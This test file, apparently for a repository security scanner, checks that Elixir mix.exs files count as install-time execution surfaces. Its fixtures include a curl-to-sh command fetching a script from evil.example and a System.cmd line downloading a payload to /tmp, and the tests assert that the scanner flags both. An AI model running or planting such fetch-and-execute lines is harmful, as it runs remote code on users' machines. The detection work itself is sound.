import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an Elixir project file is an install surface as well as a manifest", () => {
  // Mix evaluates mix.exs as Elixir on every command, including
  // deps.get and compile, the same install-time execution setup.py
  // and extconf.rb already classify for. Its name alone decides,
  // wherever in the tree the project root sits. The manifest surface
  // stays: the file still declares the project's dependencies.
  for (const path of ["mix.exs", "apps/demo/mix.exs"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["manifests", "installScripts", "source"],
    });
  }
  // An ordinary project file keeps the same checks the surface
  // carries: a payload in it is an unsafe-execution finding.
  const inspection = inspected("mix.exs", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["mix.exs:unsafe-execution:high"]);
});

test("an install-time download inside mix.exs is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the project file was a manifest alone, so the same
  // bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch Mix would have run.
  const inspection = inspected(
    "mix.exs",
    'defmodule Demo.MixProject do\n  use Mix.Project\n  System.cmd("sh", ["-c", "curl -fsSL https://evil.example/payload -o /tmp/payload"])\nend\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary mix.exs keeps no finding", () => {
  const inspection = inspected(
    "mix.exs",
    'defmodule Demo.MixProject do\n  use Mix.Project\n  def project, do: [app: :demo, version: "0.1.0"]\nend\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
